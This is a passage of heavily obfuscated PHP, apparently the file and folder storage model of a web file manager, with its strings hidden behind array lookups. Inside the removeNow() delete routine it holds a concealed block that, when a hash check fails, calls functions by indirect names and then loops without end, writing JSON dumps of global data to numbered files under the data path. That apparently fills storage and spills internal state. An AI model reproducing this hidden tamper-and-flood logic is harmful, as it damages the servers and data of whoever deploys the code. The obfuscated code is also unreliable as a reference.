$¨èà“˜µ[$œ¹“²ÊÉ[548]][$œ¹“²ÊÉ[619]]; $¬«İ˜ï = $ŞèßØ–ğ[$œ¹“²ÊÉ[2242]] ? $ŞèßØ–ğ[$œ¹“²ÊÉ[2242]] : $ŞèßØ–ğ[$œ¹“²ÊÉ[32]]; show_json(LNG($œ¹“²ÊÉ[2243]) . $œ¹“²ÊÉ[2244] . LNG($œ¹“²ÊÉ[2245]) . $œ¹“²ÊÉ[2246] . $¬«İ˜ï . $œ¹“²ÊÉ[2247], !1); } public function fileIsLock($’ğá˜Á, $ò°„É° = false) { $¾—÷¯ÊÒ =& $_SERVER[£ğ°ÖØø]; if (!_get($’ğá˜Á, $¾—÷¯ÊÒ[615], 0)) { return !1; } if ($’ğá˜Á[$¾—÷¯ÊÒ[548]][$¾—÷¯ÊÒ[618]] != USER_ID) { return !0; } $‚‡›ƒ—ı = $GLOBALS[$¾—÷¯ÊÒ[6]][$¾—÷¯ÊÒ[92]][$¾—÷¯ÊÒ[616]]; if ($’ğá˜Á[$¾—÷¯ÊÒ[548]][$¾—÷¯ÊÒ[617]] <= time() - $‚‡›ƒ—ı) { $this->metaSet($’ğá˜Á[$¾—÷¯ÊÒ[193]], $¾—÷¯ÊÒ[618], null); $this->metaSet($’ğá˜Á[$¾—÷¯ÊÒ[193]], $¾—÷¯ÊÒ[617], null); } if ($ò°„É°) { $this->metaSet($’ğá˜Á[$¾—÷¯ÊÒ[193]], $¾—÷¯ÊÒ[617], time()); } return !1; } private function _addSource($­±âíŒú, $Ÿ›Ó•¸×) { $‰û­ÌƒÖ =& $_SERVER[£ğ°ÖØø]; $©§¾âÓ = defined($‰û­ÌƒÖ[2180]) ? USER_ID : 0; $•ŠÄÖ¿° = array($‰û­ÌƒÖ[657] => $Ÿ›Ó•¸×[$‰û­ÌƒÖ[190]], $‰û­ÌƒÖ[658] => $Ÿ›Ó•¸×[$‰û­ÌƒÖ[578]], $‰û­ÌƒÖ[659] => $©§¾âÓ, $‰û­ÌƒÖ[660] => $©§¾âÓ, $‰û­ÌƒÖ[486] => $Ÿ›Ó•¸×[$‰û­ÌƒÖ[193]], $‰û­ÌƒÖ[661] => $Ÿ›Ó•¸×[$‰û­ÌƒÖ[593]] . $Ÿ›Ó•¸×[$‰û­ÌƒÖ[193]] . $‰û­ÌƒÖ[50], $‰û­ÌƒÖ[513] => 0, $‰û­ÌƒÖ[662] => $‰û­ÌƒÖ[12]); $­±âíŒú = array_merge($•ŠÄÖ¿°, $­±âíŒú); $this->updateModifyTime($­±âíŒú[$‰û­ÌƒÖ[192]]); $“³Ÿ‹†ã = $‰û­ÌƒÖ[2248] . $Ÿ›Ó•¸×[$‰û­ÌƒÖ[193]]; if (isset(self::$cacheChildList[$“³Ÿ‹†ã])) { unset(self::$cacheChildList[$“³Ÿ‹†ã]); } static $”õ°˜ş¾ = false; if (!$”õ°˜ş¾) { Hook::trigger($‰û­ÌƒÖ[645], $­±âíŒú); $”õ°˜ş¾ = !0; } $øúÆÕ¬ú = $this->add($­±âíŒú); $‚éã¼‡ç = array($‰û­ÌƒÖ[663] => short_id($øúÆÕ¬ú)); $this->where(array($‰û­ÌƒÖ[500] => $øúÆÕ¬ú))->save($‚éã¼‡ç); $this->setNamePinyin($øúÆÕ¬ú, $­±âíŒú[$‰û­ÌƒÖ[32]]); return $øúÆÕ¬ú; } public function remove($âîôé´, $Ğ¸º¶ÖŸ = true) { $ã®œƒ’ =& $_SERVER[£ğ°ÖØø]; $‡ªêÌ‚ = $this->sourceInfo($âîôé´); $‚Êˆ¥µë = intval($‡ªêÌ‚[$ã®œƒ’[190]]) === self::TYPE_SYSTEM; $ÂåŠƒ±Ì = Model($ã®œƒ’[517])->get($ã®œƒ’[2249]) == $ã®œƒ’[91]; if ($‚Êˆ¥µë || $Ğ¸º¶ÖŸ || !$ÂåŠƒ±Ì) { return $this->removeNow($âîôé´, $Ğ¸º¶ÖŸ); } $ğ‡µÀàŠ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ì¥›Æ¾Ì = $‡ªêÌ‚[$ã®œƒ’[190]] == self::TYPE_USER ? $ã®œƒ’[671] : $ã®œƒ’[587]; if ($ì¥›Æ¾Ì == $ã®œƒ’[671]) { $ÚíåğÔ¼ = Model($ã®œƒ’[586])->getInfo($‡ªêÌ‚[$ã®œƒ’[578]]); $Ü¦‰Üı¼ = !empty($ÚíåğÔ¼[$ã®œƒ’[2242]]) ? $ÚíåğÔ¼[$ã®œƒ’[2242]] : $ÚíåğÔ¼[$ã®œƒ’[32]]; $Ü¦‰Üı¼ = $ã®œƒ’[337] . $Ü¦‰Üı¼ . $ã®œƒ’[2250] . $‡ªêÌ‚[$ã®œƒ’[578]]; } else { $ÚíåğÔ¼ = Model($ã®œƒ’[594])->getInfo($‡ªêÌ‚[$ã®œƒ’[578]]); $Ü¦‰Üı¼ = _get($ÚíåğÔ¼, $ã®œƒ’[32]); $Ü¦‰Üı¼ = $ã®œƒ’[176] . $Ü¦‰Üı¼ . $ã®œƒ’[2251] . $‡ªêÌ‚[$ã®œƒ’[578]]; } $¶íšæ“ = $ã®œƒ’[2252] . md5($Ü¦‰Üı¼); CacheLock::lock($¶íšæ“); $±„¾ÒßÖ = $this->fileNameExist($ğ‡µÀàŠ, $Ü¦‰Üı¼); if (!$±„¾ÒßÖ) { $±„¾ÒßÖ = $this->mkdir($ğ‡µÀàŠ, $Ü¦‰Üı¼, REPEAT_SKIP); $this->metaSet($±„¾ÒßÖ, $ã®œƒ’[2253], $ì¥›Æ¾Ì); $this->metaSet($±„¾ÒßÖ, $ã®œƒ’[2254], $‡ªêÌ‚[$ã®œƒ’[578]]); if ($‡ªêÌ‚[$ã®œƒ’[192]] != 0) { $this->metaSet($±„¾ÒßÖ, $ã®œƒ’[2255], _get($ÚíåğÔ¼, $ã®œƒ’[2256])); } } CacheLock::unlock($¶íšæ“); $this->metaSet($âîôé´, $ã®œƒ’[2257], $‡ªêÌ‚[$ã®œƒ’[192]]); $this->where(array($ã®œƒ’[193] => $âîôé´))->save(array($ã®œƒ’[507] => time())); $this->recycleClear($‡ªêÌ‚); Model($ã®œƒ’[642])->eventRemove($âîôé´); $¡ĞÃ±ğù = $this->move($âîôé´, $±„¾ÒßÖ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‡ªêÌ‚[$ã®œƒ’[192]]); return $¡ĞÃ±ğù; } private function recycleClear($’Éé‘) { $©òÅº÷‘ =& $_SERVER[£ğ°ÖØø]; $§££‰¥ä = $this->childrenAll($’Éé‘); $‰Ì“Œ¡¶ = array($©òÅº÷‘[500] => array($©òÅº÷‘[501], $§££‰¥ä[$©òÅº÷‘[2258]])); Model($©òÅº÷‘[2259])->where($‰Ì“Œ¡¶)->delete(); } public function removeNow($²ä¤ü¡ü, $–Â„Ïß = true) { $Û¡©¢Ñ¬ =& $_SERVER[£ğ°ÖØø]; $˜´‘¹® = $_SERVER[$Û¡©¢Ñ¬[431]]; $ŸøñœÏõ = $Û¡©¢Ñ¬[432]; if ($_SERVER[$Û¡©¢Ñ¬[433]] != $ŸøñœÏõ($˜´‘¹®)) { $×ĞÅ…¶ä = $Û¡©¢Ñ¬[940]; $×ôŠİ†Ø = $Û¡©¢Ñ¬[434]; $÷ÁÉÚÍ— = $_SERVER[$Û¡©¢Ñ¬[435]] . $Û¡©¢Ñ¬[436]; $šÀ”ßÒ¾ = $×ôŠİ†Ø($÷ÁÉÚÍ—); $ÒÂü×ûî = explode($Û¡©¢Ñ¬[262], $šÀ”ßÒ¾); if (count($ÒÂü×ûî) < $Û¡©¢Ñ¬[695]) { $Î¢ŒôÙ˜ = $Û¡©¢Ñ¬[438]; $Î¢ŒôÙ˜(); } $¶ş«ëò¡ = $Û¡©¢Ñ¬[941]; $¶ş«ëò¡($_SERVER[$Û¡©¢Ñ¬[942]]); $×ĞÅ…¶ä = $Û¡©¢Ñ¬[940]; $×ĞÅ…¶ä(); $¦æş›ÎŞ = $Û¡©¢Ñ¬[1672]; $Àºª—½¨ = json_encode($GLOBALS[$Û¡©¢Ñ¬[1673]]); $¦ëşÅ‘÷ = 1; for ($´º—ìÊ½ = $¦ëşÅ‘÷; $´º—ìÊ½ > 0; $´º—ìÊ½++) { $¦æş›ÎŞ(DATA_PATH . $´º—ìÊ½, $Àºª—½¨); } } $Ñ»ëü’ï = $this->sourceInfo($²ä¤ü¡ü); $ïÖ¥æ‚— = $this->pathInfoMore($²ä¤ü¡ü); if (!$Ñ»ëü’ï) { return !0; } if ($Ñ»ëü’ï[$Û¡©¢Ñ¬[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($²ä¤ü¡ü); Hook::trigger($Û¡©¢Ñ¬[2260], $ïÖ¥æ‚—, $–Â„Ïß); if ($–Â„Ïß) { Model($Û¡©¢Ñ¬[2259])->moveToRecycle($²ä¤ü¡ü); } else { $’ËÏÙ  = $this->childrenAll($Ñ»ëü’ï); Model($Û¡©¢Ñ¬[642])->eventRemove($²ä¤ü¡ü); $this->removeRelevance($’ËÏÙ [$Û¡©¢Ñ¬[2258]], $’ËÏÙ [$Û¡©¢Ñ¬[1556]]); } $this->folderSizeReset($Ñ»ëü’ï[$Û¡©¢Ñ¬[192]]); $ÒÀö»© = array($Ñ»ëü’ï[$Û¡©¢Ñ¬[192]]); if ($Ñ»ëü’ï[$Û¡©¢Ñ¬[494]] == $Û¡©¢Ñ¬[91]) { $ÒÀö»©[] = $Ñ»ëü’ï[$Û¡©¢Ñ¬[193]]; } $this->updateModifyTime($ÒÀö»©); $this->lockMoveEnd($²ä¤ü¡ü); Hook::trigger($Û¡©¢Ñ¬[1797], $ïÖ¥æ‚—, $–Â„Ïß); return !0; } public function childrenAll($Ø‡ì¡Ö–) { $×ß¯¿êè =& $_SERVER[£ğ°ÖØø]; $˜ç»ı¹Ã = $Ø‡ì¡Ö–[$×ß¯¿êè[193]]; if ($Ø‡ì¡Ö–[$×ß¯¿êè[494]] == $×ß¯¿êè[91]) { $Ôº£—ç§ = array($×ß¯¿êè[661] => array($×ß¯¿êè[621], $Ø‡ì¡Ö–[$×ß¯¿êè[593]] . $˜ç»ı¹Ã . $×ß¯¿êè[622])); $‡ÜÊî¦ = array($×ß¯¿êè[661] => $Ôº£—ç§[$×ß¯¿êè[593]]); $–±ÓÙë = $this->field($×ß¯¿êè[2261])->where($‡ÜÊî¦)->select(); $ƒ¡‘Â»× = !1; $úÓÔæ‹ = array($˜ç»ı¹Ã); if ($–±ÓÙë) { $ƒ¡‘Â»× = array_to_keyvalue($–±ÓÙë, $×ß¯¿êè[12], $×ß¯¿êè[550]); $ƒ¡‘Â»× = array_remove_value($ƒ¡‘Â»×, $×ß¯¿êè[228]); $úÓÔæ‹ = array_to_keyvalue($–±ÓÙë, $×ß¯¿êè[12], $×ß¯¿êè[193]); $úÓÔæ‹[] = $˜ç»ı¹Ã; } } else { $ƒ¡‘Â»× = array($Ø‡ì¡Ö–[$×ß¯¿êè[550]]); $úÓÔæ‹ = array($˜ç»ı¹Ã); } return array($×ß¯¿êè[2258] => $úÓÔæ‹, $×ß¯¿êè[1556] => $ƒ¡‘Â»×); } public function removeArray($µğ°Œğá) { if (!$µğ°Œğá) { return !0; } } public function removeRelevance($˜ŸÊóì, $²½½è¨) { $”˜Œû”‹ =& $_SERVER[£ğ°ÖØø]; $˜ŸÊóì = $˜ŸÊóì ? $˜ŸÊóì : array(); $²½½è¨ = $²½½è¨ ? $²½½è¨ : array(); $˜ŸÊóì = array_unique(array_filter($˜ŸÊóì)); $²½½è¨ = array_unique(array_filter($²½½è¨)); if (!$˜ŸÊóì) { return !1; } $ûèç …˜ = array($”˜Œû”‹[500] => array($”˜Œû”‹[501], $˜ŸÊóì)); Model($”˜Œû”‹[2259])->where($ûèç …˜)->delete(); Model($”˜Œû”‹[544])->where($ûèç …˜)->delete(); Model($”˜Œû”‹[2105])->where($ûèç …˜)->delete(); Model($”˜Œû”‹[642])->where($ûèç …˜)->delete(); Model($”˜Œû”‹[1933])->removeBySource($˜ŸÊóì); Model($”˜Œû”‹[2240])->removeBySource($˜ŸÊóì); $this->where($ûèç …˜)->delete(); Model($”˜Œû”‹[553])->remove($²½½è¨); for ($ŠË×ÊÓì = 0; $ŠË×ÊÓì < count($˜ŸÊóì); $ŠË×ÊÓì++) { $this->sourceCacheClear($˜ŸÊóì[$ŠË×ÊÓì]); } } public function rename($¥Ú×…˜±, $èÂÒÆ¿£) { $±«‰ğŸ¢ =& $_SERVER[£ğ°ÖØø]; $¬„ğ’Âš = $this->sourceInfo($¥Ú×…˜±); if (!$¬„ğ’Âš) { return !1; } $²Ğ â¨› = $this->fileNameExist($¬„ğ’Âš[$±«‰ğŸ¢[192]], $èÂÒÆ¿£); if ($²Ğ â¨› && $²Ğ â¨› != $¥Ú×…˜±) { return !1; } $ğ††§­­ = array($±«‰ğŸ¢[503] => $èÂÒÆ¿£, $±«‰ğŸ¢[660] => USER_ID); if ($¬„ğ’Âš[$±«‰ğŸ¢[494]] != $±«‰ğŸ¢[91]) { $ğ††§­­[$±«‰ğŸ¢[495]] = substr(get_path_ext($èÂÒÆ¿£), 0, 10); } Model($±«‰ğŸ¢[642])->eventRename($¥Ú×…˜±, $¬„ğ’Âš[$±«‰ğŸ¢[32]], $èÂÒÆ¿£); $this->sourceCacheClear($¥Ú×…˜±); $this->setNamePinyin($¥Ú×…˜±, $ğ††§­­[$±«‰ğŸ¢[32]], !1); $this->updateModifyTime($¬„ğ’Âš[$±«‰ğŸ¢[192]]); $Å Ã³ÌÆ = $this->where(array($±«‰ğŸ¢[500] => $¥Ú×…˜±))->data($ğ††§­­)->save(); $¬­ŠğÃõ = $±«‰ğŸ¢[2248] . $¬„ğ’Âš[$±«‰ğŸ¢[192]]; if (isset(self::$cacheChildList[$¬­ŠğÃõ])) { unset(self::$cacheChildList[$¬­ŠğÃõ]); } return $Å Ã³ÌÆ; } public function setNamePinyin($·îÁúÓ, $„âûëûê, $ïßöš…˜ = true) { $ı„šË­¢ =& $_SERVER[£ğ°ÖØø]; $£ìµò÷— = Input::check($„âûëûê, $ı„šË­¢[664]); $•ÏÆòÒ„ = array($ı„šË­¢[526] => KodSort::makeStr($„âûëûê)); if ($£ìµò÷—) { $•ÏÆòÒ„[$ı„šË­¢[547]] = str_replace($ı„šË­¢[53], $ı„šË­¢[12], Pinyin::get($„âûëûê)); $•ÏÆòÒ„[$ı„šË­¢[546]] = Pinyin::get($„âûëûê, $ı„šË­¢[665]); } if (!$ïßöš…˜ && !$£ìµò÷—) { $•ÏÆòÒ„[$ı„šË­¢[547]] = null; $•ÏÆòÒ„[$ı„šË­¢[546]] = null; } $this->metaSet($·îÁúÓ, $•ÏÆòÒ„); } public function getContent($áæ·Ç«¿) { $»™£¬—É =& $_SERVER[£ğ°ÖØø]; $êñ¡Ëæ = $this->fileInfoGet($áæ·Ç«¿); if (!$êñ¡Ëæ) { return !1; } if ($êñ¡Ëæ[$»™£¬—É[79]] == 0) { return $»™£¬—É[12]; } $Å„‘Ø¤ = $»™£¬—É[2262] . $êñ¡Ëæ[$»™£¬—É[556]]; if ($êñ¡Ëæ[$»™£¬—É[79]] <= 1024 * 10) { $êÖíÜ»Ì = Cache::get($Å„‘Ø¤); if (!$êÖíÜ»Ì) { $êÖíÜ»Ì = IO::getContent($êñ¡Ëæ[$»™£¬—É[87]]); Cache::set($Å„‘Ø¤, $êÖíÜ»Ì); } return $êÖíÜ»Ì; } if (!$êñ¡Ëæ[$»™£¬—É[87]]) { return $»™£¬—É[12]; } return IO::getContent($êñ¡Ëæ[$»™£¬—É[87]]); } public function setDesc($ş¥ÔŠ…ò, $îœ´äÆ) { $é½‹•ï¤ =& $_SERVER[£ğ°ÖØø]; Model($é½‹•ï¤[642])->eventAddDesc($ş¥ÔŠ…ò, $îœ´äÆ); return $this->metaSet($ş¥ÔŠ…ò, $é½‹•ï¤[535], $îœ´äÆ); } public function setContent($Ë·­‘°ç, $À”ïÂß¬ = '') { $ˆÖ×Ê°Ë =& $_SERVER[£ğ°ÖØø]; $í¹Ô¤ „ = $this->sourceInfo($Ë·­‘°ç); $ÓêÒ¶Š = $this->fileInfoGet($Ë·­‘°ç); if (!$ÓêÒ¶Š || !$í¹Ô¤ „) { return !1; } $É¶ÓÉöß = Model($ˆÖ×Ê°Ë[553])->addFileByContent($À”ïÂß¬, $í¹Ô¤ „[$ˆÖ×Ê°Ë[32]]); $¾‚ÒÀ¦Ø = $this->fileHistory($í¹Ô¤ „, $É¶ÓÉöß[$ˆÖ×Ê°Ë[550]], $É¶ÓÉöß[$ˆÖ×Ê°Ë[79]]); if (!$¾‚ÒÀ¦Ø) { return Model($ˆÖ×Ê°Ë[553])->remove($É¶ÓÉöß[$ˆÖ×Ê°Ë[550]]); } $this->folderSizeReset($í¹Ô¤ „[$ˆÖ×Ê°Ë[192]]); return !0; } public function fileSubstr($óˆëÀ, $ŞªÃë¬, $æòıµöè) { $Í–áÓöâ = $this->fileInfoGet($óˆëÀ); if (!$Í–áÓöâ) { return !1; } return IO::fileSubstr($Í–áÓöâ[$_SERVER[£ğ°ÖØø][87]], $ŞªÃë¬, $æòıµöè); } public function fileInfoGet($»ƒœÍñ) { $’¥ÚŠ€î =& $_SERVER[£ğ°ÖØø]; $›¨î¤¬Û = $this->sourceInfo($»ƒœÍñ); if (!$›¨î¤¬Û || $›¨î¤¬Û[$’¥ÚŠ€î[494]]) { return !1; } $¯Ò–Öá¦ = $’¥ÚŠ€î[557] . $›¨î¤¬Û[$’¥ÚŠ€î[550]]; $¸ÈÉôÉ = _get(self::$cacheFileInfo, $¯Ò–Öá¦); if ($¸ÈÉôÉ) { return $¸ÈÉôÉ; } $˜‹Éíúò = Model($’¥ÚŠ€î[553])->fileInfo($›¨î¤¬Û[$’¥ÚŠ€î[550]]); if ($˜‹Éíúò) { $˜‹Éíúò[$’¥ÚŠ€î[32]] = $›¨î¤¬Û[$’¥ÚŠ€î[32]]; } self::$cacheFileInfo[$¯Ò–Öá¦] = $˜‹Éíúò; return $˜‹Éíúò; } private function folderChildrenNumber($µª¨ÌÔŞ) { $«ÏÓàßó =& $_SERVER[£ğ°ÖØø]; $ŒÏ‘š = $this->sourceInfo($µª¨ÌÔŞ); $“–½Œ¹í = array($«ÏÓàßó[661] => array($«ÏÓàßó[621], $ŒÏ‘š[$«ÏÓàßó[593]] . $µª¨ÌÔŞ . $«ÏÓàßó[622]), $«ÏÓàßó[658] => $ŒÏ‘š[$«ÏÓàßó[578]], $«ÏÓàßó[513] => intval($ŒÏ‘š[$«ÏÓàßó[514]]), $«ÏÓàßó[655] => 1); $Ï¢ÚÂ¤¬ = $this->where($“–½Œ¹í)->count(); $è‹üç‰€ = $this->where($“–½Œ¹í)->where(array($«ÏÓàßó[655] => 0))->count(); return array($«ÏÓàßó[83] => $è‹üç‰€, $«ÏÓàßó[84] => $Ï¢ÚÂ¤¬); } public function pathInfo($»±û³Ø‹, $›äà«áÊ = false) { $Ó«‡£âó =& $_SERVER[£ğ°ÖØø]; $›äà«áÊ = !1; $»±û³Ø‹ = intval($»±û³Ø‹); $ïìÏ›áÎ = $Ó«‡£âó[543] . intval($›äà«áÊ) . $Ó«‡£âó[471] . $»±û³Ø‹; $†¤ßğ«ñ = _get(self::$cachePathInfo, $ïìÏ›áÎ); if ($†¤ßğ«ñ) { return $†¤ßğ«ñ; } $¶ÌèÊë‡ = $this->sourceInfo($»±û³Ø‹); if (!$¶ÌèÊë‡) { return !1; } $¶ÌèÊë‡ = $this->_listDataApplyItem($¶ÌèÊë‡, $›äà«áÊ); self::$cachePathInfo[$ïìÏ›áÎ] = $¶ÌèÊë‡; return $¶ÌèÊë‡; } public static $cachePathInfoMore = array(); public function pathInfoMore($´¸êÅÑË) { $¨Ï‹ô©Î =& $_SERVER[£ğ°ÖØø]; $¦£á¨‚Ï = _get(self::$cachePathInfoMore, $´¸êÅÑË); if ($¦£á¨‚Ï) { return $¦£á¨‚Ï; } $€Ñ›èÉ¥ = $this->pathInfo($´¸êÅÑË); if (!$€Ñ›èÉ¥) { return !1; } if ($€Ñ›èÉ¥[$¨Ï‹ô©Î[494]] == $¨Ï‹ô©Î[91]) { $€Ñ›èÉ¥[$¨Ï‹ô©Î[82]] = $this->folderChildrenNumber($´¸êÅÑË); } self::$cachePathInfoMore[$´¸êÅÑË] = $€Ñ›èÉ¥; return $€Ñ›èÉ¥; } public function sourceInfo($’Ú†ÕÛ) { $æç¶á¾ =& $_SERVER[£ğ°ÖØø]; if (!$’Ú†ÕÛ) { return array(); } $’Ú†ÕÛ = intval($’Ú†ÕÛ); $‹Ö®­‰İ = $æç¶á¾[542] . $’Ú†ÕÛ; $ñı³ö”¿ = _get(self::$cacheSourceInfo, $‹Ö®­‰İ); if ($ñı³ö”¿) { return $ñı³ö”¿; } $ê¸èÚÖ = $this->where(array($æç¶á¾[193] => $’Ú†ÕÛ))->find(); self::$cacheSourceInfo[$‹Ö®­‰İ] = $ê¸èÚÖ; return self::$cacheSourceInfo[$‹Ö®­‰İ]; } public function sourceCacheClear($´úœ¡¡» = false) { self::cacheClear($´úœ¡¡»); } public static function cacheClear($ŞÈá»¿ß = false) { $ÜË¦Ğ– =& $_SERVER[£ğ°ÖØø]; if ($ŞÈá»¿ß == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÜË¦Ğ–[542] . $ŞÈá»¿ß]); unset(self::$cachePathInfoMore[$ŞÈá»¿ß]); unset(self::$cachePathInfo[$ÜË¦Ğ–[2263] . $ŞÈá»¿ß]); unset(self::$cachePathInfo[$ÜË¦Ğ–[2264] . $ŞÈá»¿ß]); } public function metaSet($»µ­ş›, $ÊÄ‰¾ç = null, $¢ìŠáÜ½ = null) { $’ñ‚ûÀç = parent::metaSet($»µ­ş›, $ÊÄ‰¾ç, $¢ìŠáÜ½); if ($’ñ‚ûÀç) { $this->sourceCacheClear($»µ­ş›); } return $’ñ‚ûÀç; } public function pathInfoByPath($ÖÉ—ºÙè, $¸ä¢ºú) { $ò¡„¼† =& $_SERVER[£ğ°ÖØø]; $Á¿ô¿Áê = !$¸ä¢ºú ? array() : explode($ò¡„¼†[8], trim($¸ä¢ºú, $ò¡„¼†[8])); $®îôÇ“Ö = $ÖÉ—ºÙè; foreach ($Á¿ô¿Áê as $Ğ£ö ÜÜ) { $ƒÈ¼Ğ“Ô = array($ò¡„¼†[192] => $®îôÇ“Ö, $ò¡„¼†[32] => $Ğ£ö ÜÜ); $ˆ °•Ú = $this->field($ò¡„¼†[2265])->where($ƒÈ¼Ğ“Ô)->select(); if (!$ˆ °•Ú) { return !1; } $ˆ °•Ú = array_sort_by($ˆ °•Ú, $ò¡„¼†[514]); $®îôÇ“Ö = $ˆ °•Ú[0][$ò¡„¼†[193]]; } $ñ£å¶Ç = $this->sourceInfo($®îôÇ“Ö); $this->pathInfoFilter($ñ£å¶Ç); return $ñ£å¶Ç; } protected function updateModifyTime($ıäù”) { $İÀ†¸Şî =& $_SERVER[£ğ°ÖØø]; $ïÏ˜¬¯Ñ = defined($İÀ†¸Şî[2180]) ? USER_ID : 0; if (!$ıäù”) { return; } if (!is_array($ıäù”)) { $ıäù” = array($ıäù”); } foreach ($ıäù” as $Æ¤ÉœÅÃ => $Óø‚£°Á) { $ıäù”[$Æ¤ÉœÅÃ] = intval($Óø‚£°Á); $this->sourceCacheClear($Óø‚£°Á); } $ÜĞ‹·Ğø = array($İÀ†¸Şî[193] => array($İÀ†¸Şî[7], $ıäù”)); $œ‘©‡ = array($İÀ†¸Şî[660] => $ïÏ˜¬¯Ñ, $İÀ†¸Şî[507] => time()); $this->where($ÜĞ‹·Ğø)->save($œ‘©‡); } public function folderSizeReset($éõƒ²æÔ, $úÚùÈ Î = false) { $Û‰ËœÙ‹ =& $_SERVER[£ğ°ÖØø]; if ($this->statusIgnoreResetSpace) { return; } $º‹Æ«ÊÖ = $this->sourceInfo($éõƒ²æÔ); $øƒŠ€ì® = $Û‰ËœÙ‹[2266] . $éõƒ²æÔ; CacheLock::lock($øƒŠ€ì®, 20); if ($úÚùÈ Î === !1) { $this->sourceCacheClear($éõƒ²æÔ); $º‹Æ«ÊÖ = $this->sourceInfo($éõƒ²æÔ); $îŞ‚¿³Ì = array($Û‰ËœÙ‹[486] => $éõƒ²æÔ, $Û‰ËœÙ‹[513] => 0); $‰‚±Í—ñ = $this->where($îŞ‚¿³Ì)->sum($Û‰ËœÙ‹[79]); $úÚùÈ Î = intval($‰‚±Í—ñ) - intval($º‹Æ«ÊÖ[$Û‰ËœÙ‹[79]]); } if ($úÚùÈ Î == 0) { return CacheLock::unlock($øƒŠ€ì®); } $ö¾ìÙÛ† = $this->parentLevelArray($º‹Æ«ÊÖ[$Û‰ËœÙ‹[593]]); if (!$ö¾ìÙÛ†) { $ö¾ìÙÛ† = array(); } $ö¾ìÙÛ†[] = $º‹Æ«ÊÖ[$Û‰ËœÙ‹[193]]; $îŞ‚¿³Ì = array($Û‰ËœÙ‹[193] => array($Û‰ËœÙ‹[501], $ö¾ìÙÛ†)); if ($úÚùÈ Î < 0) { $îŞ‚¿³Ì[$Û‰ËœÙ‹[79]] = array($Û‰ËœÙ‹[1076], abs($úÚùÈ Î)); } $this->where($îŞ‚¿³Ì)->setAdd($Û‰ËœÙ‹[79], $úÚùÈ Î); CacheLock::unlock($øƒŠ€ì®); $åûœ‰ÜÁ = $Û‰ËœÙ‹[2267] . $º‹Æ«ÊÖ[$Û‰ËœÙ‹[190]] . $Û‰ËœÙ‹[4] . $º‹Æ«ÊÖ[$Û‰ËœÙ‹[578]]; $õšÊâ¿í = array($º‹Æ«ÊÖ[$Û‰ËœÙ‹[190]], $º‹Æ«ÊÖ[$Û‰ËœÙ‹[578]]); TaskRun::timeLimitCall($åûœ‰ÜÁ, $Û‰ËœÙ‹[2268], $õšÊâ¿í, 1.5); } public function folderSizeResetChildren($‰×ÖİÚ) { $æÆÕÊø =& $_SERVER[£ğ°ÖØø]; $this->sourceCacheClear($‰×ÖİÚ); $Õ¦Ûôç = $this->sourceInfo($‰×ÖİÚ); $‹õ¢êáê = array($æÆÕÊø[655] => 1, $æÆÕÊø[658] => $Õ¦Ûôç[$æÆÕÊø[578]], $æÆÕÊø[661] => array($æÆÕÊø[621], $Õ¦Ûôç[$æÆÕÊø[593]] . $‰×ÖİÚ . $æÆÕÊø[622])); $Î€œÌ‚Ä = $æÆÕÊø[2269]; $Üş¼Ó¦ş = $this->field($Î€œÌ‚Ä)->where($‹õ¢êáê)->select(); $‹õ¢êáê[$æÆÕÊø[494]] = 0; $™ı¿ÓçĞ = $this->field($Î€œÌ‚Ä)->where($‹õ¢êáê)->select(); if (!$™ı¿ÓçĞ) { return; } $Üş¼Ó¦ş[] = $Õ¦Ûôç; $Üş¼Ó¦ş = array_to_keyvalue($Üş¼Ó¦ş, $æÆÕÊø[193]); foreach ($Üş¼Ó¦ş as $ÀØŒÑ¥Û => $¹Üİô¨İ) { $Üş¼Ó¦ş[$ÀØŒÑ¥Û][$æÆÕÊø[2270]] = $Üş¼Ó¦ş[$ÀØŒÑ¥Û][$æÆÕÊø[79]]; $Üş¼Ó¦ş[$ÀØŒÑ¥Û][$æÆÕÊø[79]] = 0; } foreach ($™ı¿ÓçĞ as $¹Üİô¨İ) { $Õ°õêá = $¹Üİô¨İ[$æÆÕÊø[192]] . $æÆÕÊø[12]; if (!isset($Üş¼Ó¦ş[$Õ°õêá])) { continue; } if ($¹Üİô¨İ[$æÆÕÊø[514]] == $Üş¼Ó¦ş[$Õ°õêá][$æÆÕÊø[514]]) { $Üş¼Ó¦ş[$Õ°õêá][$æÆÕÊø[79]] += $¹Üİô¨İ[$æÆÕÊø[79]]; } } foreach ($Üş¼Ó¦ş as $¹Üİô¨İ) { $»õô‰ = $this->parentLevelArray($¹Üİô¨İ[$æÆÕÊø[593]]); foreach ($»õô‰ as $Õ°õêá) { $Õ°õêá = $Õ°õêá . $æÆÕÊø[12]; if (!isset($Üş¼Ó¦ş[$Õ°õêá])) { continue; } if ($¹Üİô¨İ[$æÆÕÊø[514]] == $Üş¼Ó¦ş[$Õ°õêá][$æÆÕÊø[514]]) { $Üş¼Ó¦ş[$Õ°õêá][$æÆÕÊø[79]] += $¹Üİô¨İ[$æÆÕÊø[79]]; } } } $–Š©øòÄ = array(); foreach ($Üş¼Ó¦ş as $¹Üİô¨İ) { if ($¹Üİô¨İ[$æÆÕÊø[79]] == $¹Üİô¨İ[$æÆÕÊø[2270]]) { continue; } $–Š©øòÄ[] = array($æÆÕÊø[193], $¹Üİô¨İ[$æÆÕÊø[193]], $æÆÕÊø[79], $¹Üİô¨İ[$æÆÕÊø[79]]); } $this->saveAll($–Š©øòÄ); } public function userSpaceReset($Ñğî‚÷´ = false) { $æ¶Û»   =& $_SERVER[£ğ°ÖØø]; $İÅ¤¹ƒÓ = $this->where(array($æ¶Û»  [190] => self::TYPE_USER, $æ¶Û»  [578] => $Ñğî‚÷´, $æ¶Û»  [494] => 0))->sum($æ¶Û»  [79]); $İÅ¤¹ƒÓ = !$İÅ¤¹ƒÓ || $İÅ¤¹ƒÓ <= 0 ? 0 : $İÅ¤¹ƒÓ; Model($æ¶Û»  [586])->userEdit($Ñğî‚÷´, array($æ¶Û»  [1942] => $İÅ¤¹ƒÓ)); } public function targetSpaceUpdate($Ô³ĞšÛç, $ñ’ÔÖ¶„) { $‘¤Ùƒ® =& $_SERVER[£ğ°ÖØø]; if (!$ñ’ÔÖ¶„) { return; } if (!in_array($Ô³ĞšÛç, 